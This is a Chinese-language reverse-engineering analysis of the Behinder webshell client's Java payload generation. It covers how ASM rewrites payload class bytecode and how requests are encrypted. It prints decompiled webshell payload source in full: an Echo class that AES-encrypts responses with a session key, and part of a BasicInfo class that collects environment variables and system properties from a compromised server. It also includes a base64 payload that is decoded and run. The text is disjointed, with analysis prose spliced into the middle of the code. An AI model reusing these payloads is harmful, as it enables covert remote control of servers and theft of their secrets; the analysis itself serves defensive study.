cweWZDSjhJM2plRnYzTHdlN0JKSkpoaEVvQU5ROGpWMGdDb3Q3UHdLQ2FydXZkWTJOUEZKYXpudnpBcF
Y2N2kzSjJCNmV4RUYxbzBjM0VKbHJFTVlZMEthMVFLU2ZycTUzbFVIMnRmRlhOWHhnNkxOSnhCSlppQU
Z1SjF6YnB1OXdlNk14cjlmRUp1bDlTWW11VGF1bHZ0eldtMjJ2eHE0bnJWMlVuUkw3Z2ZJYW5XTkF5Sm
trSnN6TG56ZFJneng0WXBvcFpTZllOVDh0VHZBQ1k2WWpBZnVheU5oelJlYUo5TGV3cVg0MnQ4cmRKcj
lMOGM2cWN5TXhhQ3FUMk5YY0hSejBKbFk0NkU4bWtXdm8wTjFXdm5qMnJLOWJEbjVQSGpEMVhLN2FNdD
YxQTRRV1hCREFLeU1ydlMyNjFKSllGTmlxcTRFWUk0cFh6czV2U3RXdmxmcUF0QTlFQjk4b3BtVVpZND
dWcVpvNllzMkVNYldlWndoR21nQmFZRWY1M3daTHBQZmp3dzVoNEVxWmlkRmJWNVAxQVI4cHF6N2JRTm
VmdGNSMDRpSmpEYlYyN0xSaFQ3NWhGbE41SlZIbmgwQg==";
$content=base64_decode($content);
main($content);
入口
跳过前面的连接函数，直接进入 jsp 的 echo 方法。 
之后同样进入到 Utils.getData() 方法 
注意观察这个参数传递，和进入的方法，此处是 Param.getParamedClass()
Utils.getParamedClass()  
和PHP的加载方式有很大差别，这里仔细跟进一下，还是先获取到类的位置，然后创建一个
ClassReader 对象，这个 ClassReader 是 ASM 用读取和解析java字节码的，实例中存储的也是字
节码文件的数组。这里应该就是 net.rebeyond.behinder.payload.java.Echo.class 这个类。
package net.rebeyond.behinder.payload.java;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
public class Echo {
   public static String content;
   private Object Request;
   private Object Response;
   private Object Session;
   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var13 = false;
      Object so;
      Method write;
      label77: {
         try {
            var13 = true;
            this.fillContext(obj);
            result.put("status", "success");
            result.put("msg", content);
            var13 = false;
            break label77;
         } catch (Exception var17) {
            result.put("msg", var17.getMessage());
            result.put("status", "success");
            var13 = false;
         } finally {
            if (var13) {
               try {
                  so = 
this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, 
true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var14) {
               }
            }
         }
         try {
            so = 
this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson(result, 
true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var15) {
         }
         return true;
      }
      try {
         so = 
this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         write = so.getClass().getMethod("write", byte[].class);
         write.invoke(so, this.Encrypt(this.buildJson(result, 
true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var16) {
      }
      return true;
   }
   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", 
String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }
   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();
      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", 
(Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", 
byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
之后 classReader.accept() 这个方法应该是 ASM 修改类字节码的方法，作用是给里面的变量赋
值，这里是给 content 变量赋值为之前获取到随机字符串。之后将字节码进行还原得到 result 。
这里可以自己添加一个步骤，将字节码文件转换为 .class 文件来观看他的操作,而且之后有个奇怪
的操作,会重新生成一个随机的类名将原本的类名进行替换,所有此处也需要查看之后的变化.再最后
就是将修改完的字节码进行加密,然后返回. 
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", 
byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }
         sb.append(value);
         sb.append("\",");
      }
      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }
      sb.append("}");
      return sb.toString();
   }
   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }
      this.Response.getClass().getMethod("setCharacterEncoding", 
String.class).invoke(this.Response, "UTF-8");
   }
}
通过新建三路比较，得到中间差异不是很大，就是类名包名变了。
通过反射查看到类名替换后字节码中 content 的内容 
此处因为随机替换的类名，所以替换的位置暂时先写死。可以看到的是 content 属性的值就是随
机字符串。
之后就是熟悉的请求发送和响应包解析了
这里我们还是结合木马和发送的内容进行分析
package net.rebeyond.behinder.payload.java;
import java.io.File;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
import java.util.Map.Entry;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
public class BasicInfo {
   public static String whatever;
   private Object Request;
   private Object Response;
   private Object Session;
   public boolean equals(Object obj) {
      String result = "";
      boolean var22 = false;
      Object so;
      Method write;
      label132: {
         try {
            var22 = true;
            this.fillContext(obj);
            StringBuilder basicInfo = new StringBuilder("环境变量:");
            Map env = System.getenv();
            Iterator var5 = env.keySet().iterator();
            while(var5.hasNext()) {
               String name = (String)var5.next();
               basicInfo.append(name + "=" + (String)env.get(name) + "");
            }
            basicInfo.append("JRE系统属性:
");
            Properties props = System.getProperties();
            Set entrySet = props.entrySet();
            Iterator var7 = entrySet.iterator();
            while(var7.hasNext()) {
               Entry entry = (Entry)var7.next();
               basicInfo.append(entry.getKey() + " = " + entry.getValue() + "
");
            }
            String currentPath = (new File("")).getAbsolutePath();
            String driveList = "";
            File[] roots = File.listRoots();
            File[] var10 = roots;